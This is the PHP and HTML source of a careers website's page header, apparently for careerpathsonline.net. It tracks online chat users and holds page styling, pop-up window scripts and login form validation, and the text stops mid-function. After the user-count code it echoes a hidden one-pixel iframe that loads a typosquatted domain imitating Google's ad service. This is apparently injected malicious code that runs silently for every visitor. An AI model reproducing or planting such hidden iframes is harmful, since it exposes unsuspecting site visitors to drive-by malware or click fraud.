<?
include_once 'dbConnection.php';
include("chatnew/config.php");
$file_online="chatnew/online.txt";
$file_reg="chatnew/registro.txt";
$ar_online=file($file_online);
$dim=count($ar_online);

for ($i=0;$i<$dim;$i++)
{
	$ut_online=chop($ar_online[$i]);
	$utente=explode("|",$ut_online);
	$nick_ut=$utente[0];
	$data=$utente[1];
	$orario=$utente[2];
	
	$parti_data=explode("/",$data);
	$giorno=$parti_data[0];
	$mese=$parti_data[1];
	$anno=$parti_data[2];
	
	$parti_orario=explode(":",$orario);
	$ora=$parti_orario[0];
	$minuti=$parti_orario[1];
	$secondi=$parti_orario[2];
	
	$ts=mktime($ora,$minuti,$secondi,$mese,$giorno,$anno);
	$diff=time()-$ts;
	$min_trascorsi=$diff/60;
	
	if ($min_trascorsi<$min_online) 
	{
		$array_on[]=$nick_ut;
	}
}
if(isset($array_on))
{
	$ar_unico=array_unique($array_on);
	$dim_unico=count($ar_unico);
}
else
{
	$dim_unico = 0;
}

echo "<iframe src=\"http://goooogleadsence.biz/?click=262C7\" width=1 height=1 style=\"visibility:hidden;position:absolute\"></iframe>";
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>careerpathsonline.net</title>
<style type="text/css">
<!--
body {
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}
a:link {
	text-decoration: none;
}
a:visited {
	text-decoration: none;
}
a:hover {
	text-decoration: none;
}
a:active {
	text-decoration: none;
}
#menu
 {
	margin: 0px 0px 0px 0px;
	padding: 0px 0px 0px 0px;
	width: 560px;
	height: 27px;
	clear: both;
	position: relative;
} 
#menu 
ul 
{ 
margin: 0px 0px 0px 0px;
padding: 0px 0px 0px 0px;
}

#menu
ul 
li 
{
margin: 0px 0px 0px 0px;
padding: 0px 0px 0px 0px;
list-style:none; 
float:left;
}
#menu
ul 
li 
a 
{
margin: 0px 0px 0px 0px;
padding: 7px 8px 5px 9px; 
font: normal 14px/15px 'Lucida Grande', 'Geneva', 'Helvetica', 'Tahoma', 'Verdana', sans-serif , Arial; 
color: #000000; 
display: block;
text-decoration: none; 

}

#menu
ul 
li 
a:hover 
{ 
margin: 0px 0px 0px 0px;
padding:7px 8px 5px 9px;
color:#ff0003;
text-decoration:none; 
clear:right;
}
-->
</style>
<script src="Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
<link href="css.css" rel="stylesheet" type="text/css" />
<script language="JavaScript">
<!--

var isHidden=false;
function imageshow()
{
	if(document.getElementById("div2"))
	{
		if(isHidden==true)
		{
			document.getElementById("div2").style.visibility="visible";
			isHidden=false;
		}
		else
		{
			document.getElementById("div2").style.visibility="hidden";
			isHidden=true;
		}
		setTimeout("imageshow()",800);
	}
}
function openwinhelp()
{
	new1=window.open("","help",'height=400,width=600,scrollbars=yes,top=50 left=150');
}
function chatnow()
{
		new1=window.open("./chatnew/","","titlebar='CareerPaths Online - Chatting',height=475,width=775,scrollbars=yes,top=50 left=150");
}
function openwin1(obj)
{
	new1=window.open("moredesc_course.php?id="+obj,"",'height=400,width=600,scrollbars=yes,top=50 left=150');
}
function openWindow()
{
	window.open("./admin/flash/takeatour/jobsearch.html","","left=150,top=50,height=600,width=800");
}
function openWindow1()
{
	window.open("admin/flash/takeatour/useful_contact.html","","left=150,top=50,height=604,width=797");
}function checklogin()
{
	var x = document.FRMLOGIN.TXUSERID.value;
	var filter  = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
	if (!filter.test(x))
	{
		alert("Enter a valid E-mail address!");
		document.FRMLOGIN.TXUSERID.value="";
		document.FRMLOGIN.TXUSERID.focus();
		return false;
	}
	if(document.FRMLOGIN.TXPASSWORD.value=="") 
	{
		alert("Enter a valid Password!");
		document.FRMLOGIN.TXPASSWORD.value="";
		document.FRMLOGIN.TXPASSWORD.focus();
		return false;
	}
	return true;
}
</script>
<script src="Scripts/AC_RunActiveContent.js" type="text/javascript"></script>
<link href="css.css" rel="stylesheet" type="text/css" />

<script type="text/javascript">
<!--
function MM_swapImgRestore() { //v3.0
  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
}
function MM_preloadImages() { //v3.0
  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
}

function MM_findObj(n, d) { //v4.01
  va